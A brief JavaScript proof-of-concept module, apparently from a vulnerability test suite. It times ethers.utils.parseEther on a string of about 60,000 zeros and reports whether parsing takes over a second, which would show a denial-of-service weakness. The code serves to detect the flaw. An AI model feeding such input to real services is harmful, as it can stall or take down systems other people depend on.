function exploitFunction(payload) {
  const measureTime = require("../utils").measureTime;
  const { ethers } = require("ethers");

  let { attack_str } = payload;

  let t = measureTime(function () {
    try {
      ethers.utils.parseEther("1." + "0".repeat(60000) + "1");
    } catch (e) {}
  });

  let time = t[0] + t[1] / 1000000000;

  if (time > 1) {
    return true;
  }

  return false;
}

module.exports = { exploitFunction };